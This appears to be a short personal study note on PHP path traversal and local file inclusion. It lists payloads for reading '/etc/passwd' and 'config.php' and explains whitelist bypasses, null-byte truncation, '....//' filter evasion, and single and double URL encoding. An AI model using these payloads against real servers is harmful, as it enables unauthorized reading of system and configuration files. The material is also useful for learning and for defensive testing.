[[php]]
* `/etc/passwd`
* `../../..etc/passwd`
* `language=./languages/../../../../etc/passwd` - bypass whitelist
* %00 - PHP stops reading file path and name, e. g. ../../../etc/passwd%00.php
* ....//....//....//etc/passwd - to bypass auto replace
* double URL encode, whole URL or just . / symbols
#### Obfuscation [[encoding]]
1. **URL Encoded Bypass:** The attacker can use the URL-encoded version of the payload like `?file=%2e%2e%2fconfig.php`. The server decodes this input to `../config.php`, bypassing the filter.
2. **Double Encoded Bypass:** The attacker can use double encoding if the application decodes inputs twice. The payload would then be `?file=%252e%252e%252fconfig.php`, where a dot is `%252e`, and a slash is `%252f`. The first decoding step changes `%252e%252e%252f` to `%2e%2e%2f`. The second decoding step then translates it to `../config.php`.
3. **Obfuscation:** An attacker could use the payload `....//config.php`, which, after the application strips out the apparent traversal string, would effectively become `../config.php`.
